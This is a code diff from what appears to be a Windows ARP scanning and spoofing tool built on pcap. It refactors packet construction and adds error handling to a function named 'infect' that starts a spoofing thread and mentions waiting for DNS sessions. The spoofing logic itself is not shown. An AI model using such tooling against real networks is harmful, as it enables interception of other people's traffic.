@@ -39,19 +39,14 @@ static DWORD WINAPI send_packets(LPVOID lparam)
 	ether_header = (ether_hdr*)packet;
 	arp_header = (arp_ether_ipv4*)(packet + sizeof(ether_hdr));
 
-	//ETHERNET LAYER
-	memcpy(ether_header->src_addr, send_packets_params.adapter->Address, ETH_ALEN); //this adapter's mac
-	memset(ether_header->dest_addr, 0xff, ETH_ALEN); //broadcast
-	ether_header->frame_type = htons(ETH_P_ARP); //LAYER3:ARP (0x0806)
-
-	//NETWORK LAYER
-	arp_header->htype = htons(ARP_HTYPE_ETHER);
-	arp_header->ptype = htons(ARP_PTYPE_IPv4);
-	arp_header->hlen = 6;
-	arp_header->plen = 4;
-	arp_header->op = htons(1); // who has
-	memcpy(arp_header->sha, ether_header->src_addr, ETH_ALEN);
-	memset(arp_header->tha, 0, ETH_ALEN);
+	build_packet(
+		packet,
+		0,
+		0,
+		send_packets_params.adapter->Address,
+		NULL,
+		1
+	);
 
 	u_long target;
 	u_long netmask;
@@ -206,7 +201,7 @@ DWORD WINAPI scan(LPVOID lparam)
 DWORD WINAPI infect(LPVOID lparam)
 {
 	pCommand command = (pCommand)lparam;
-
+	
 	PIP_ADAPTER_INFO pAdapterInfo = NULL;
 	ULONG outBufLen = 0;
 	GetAdaptersInfo(pAdapterInfo, &outBufLen);
@@ -240,6 +235,9 @@ DWORD WINAPI infect(LPVOID lparam)
 			break;
 	}
 
+	if (!adapter)
+		return -1;
+
 	/*open the adapter*/
 	fp = pcap_open(
 		adapter->name,
@@ -257,9 +255,13 @@ DWORD WINAPI infect(LPVOID lparam)
 	HANDLE hThread;
 	hThread = CreateThread(NULL, 0, start_spoof, NULL, 0, NULL);
 	if (!hThread)
+	{
 		pcap_close(fp);
+		return -1;
+	}
 
 	//deal with routing stuff (wait for DNS sessions)
+	
 	return 0;
 }
 
